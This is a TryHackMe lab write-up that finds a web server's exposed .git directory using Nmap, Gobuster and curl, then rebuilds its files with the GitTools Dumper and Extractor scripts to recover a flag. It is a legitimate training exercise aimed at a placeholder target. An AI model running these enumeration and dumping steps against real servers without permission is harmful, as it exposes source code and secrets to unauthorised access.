> **Platform:** TryHackMe  
> **Room:** Room 404  
> **Tools Used:** Nmap, Gobuster, cURL, GitTools  

# Room 404

**Date:** 2026-08-10

## Description
>
>The objective of this room is to enumerate a web service, identify an exposed Git repository, recover its contents, and >retrieve the flag from the recovered files.
>
>**Target:** `TARGET_IP`
>
---

# Initial Reconnaissance

The first step was to identify which ports and services were exposed on the target machine.

## Nmap

I started with an Nmap scan:

```bash
nmap TARGET_IP
```

The scan revealed an HTTP service running on port `8080`.

This indicated that the target was hosting a web application accessible through:

```text
http://TARGET_IP:8080/
```

At this point, the next step was to enumerate directories and files exposed by the web server.

---

# Directory Enumeration

## Gobuster

I used Gobuster to enumerate directories and files:

```bash
gobuster dir -u http://TARGET_IP:8080/ -w <wordlist>
```

Among the discovered resources was:

```text
/.git/HEAD
```

This was an important finding because `.git` is normally an internal directory belonging to a Git repository and should not be publicly accessible through a web server.

---

# Git Repository Enumeration

I accessed:

```text
http://TARGET_IP:8080/.git/HEAD
```

The server returned:

```text
ref: refs/heads/main
```

This tells us that the repository's `HEAD` currently points to the `main` branch.

Therefore, I checked:

```text
http://TARGET_IP:8080/.git/refs/heads/main
```

The response was:

```text
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

This is the SHA-1 identifier of the commit currently referenced by the `main` branch.

The Git structure was therefore:

```text
HEAD
  ↓
refs/heads/main
  ↓
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

---

# Inspecting the Git Object

Git stores repository objects inside:

```text
.git/objects/
```

Git object hashes are divided into two parts. Therefore, the commit object could be found at:

```text
.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
```

I accessed the object with cURL:

```bash
curl http://TARGET_IP:8080/.git/objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
```

The response appeared as unreadable characters:

```text
x��M...
```

This was expected because Git objects are stored in a compressed format rather than as plain text.

---

# Attempting to Clone the Repository

I initially attempted to clone the exposed repository directly:

```bash
 git clone http://TARGET_IP:8080/.git/ repo
```

However, the server returned:

```text
404 Not Found
fatal: repository not found
```

This indicated that the web server was exposing individual `.git` files, but it was not operating as a Git server capable of handling a normal `git clone` request.

Therefore, I needed another way to reconstruct the exposed repository.

---

# Recovering the Git Repository

I used **GitTools**, specifically the `Dumper` component.

GitTools can be used to download files and Git objects from a repository when the `.git` directory is accidentally exposed through a web server.

I cloned GitTools:

```bash
 git clone https://github.com/internetwache/GitTools.git
```

Then entered the Dumper directory:
```bash
 cd GitTools/Dumper
```

I ran:

```bash
 ./gitdumper.sh http://TARGET_IP:8080/.git/ dump
```

The tool successfully recovered several Git files and objects, including:

```text
 HEAD
 config
 index
 refs/heads/main
 logs/HEAD
 objects/0f/13550b4b...
 objects/fa/45dbd693...
 objects/a5/965c580f...
 objects/25/75ab073f...
 objects/0a/12caa4e...
```

This gave me a local copy of the exposed `.git` data.

---

# Extracting the Repository Contents

The downloaded Git objects were not immediately presented as normal project files.

GitTools also provides an `Extractor` component that reconstructs files from the recovered Git objects.

I entered the Extractor directory:

```bash
cd ../Extractor
```

Then ran:

```bash
./extractor.sh ../Dumper/dump ../extracted
```

The tool identified the commit:

```text
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

and recovered three files:

```text
 README.md
 app.js
 index.html
```

The recovered repository structure was therefore approximately:

```text
extracted/
└── 0-0f13550b4cb13e9f30c61d5b342c532d21e45bda/
    ├── README.md
    ├── app.js
    └── index.html
```

---

# Reading the README

I navigated to the extracted repository:

```bash
cd ../extracted/0-0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

```bash
ls -la
```

Read the README:

```bash
cat README.md
```

---

# Key Takeaways
### Nmap

Used to identify open ports and services:

```bash
nmap TARGET_IP
```

### Gobuster

Used to discover directories and files:

```bash
gobuster dir -u http://TARGET_IP:8080/ -w <wordlist>
```

### cURL

Used to manually inspect discovered resources:

```bash
curl http://TARGET_IP:8080/.git/HEAD
```

### GitTools

Used to reconstruct an exposed `.git` directory:

```bash
./gitdumper.sh http://TARGET_IP:8080/.git/ dump
```

### GitExtractor

Used to reconstruct the actual files from the recovered Git objects:

```bash
./extractor.sh ../Dumper/dump ../extracted
```

---

# Final Result

The exposed `.git` directory allowed the repository to be reconstructed. The recovered `README.md` contained the flag required by the room.
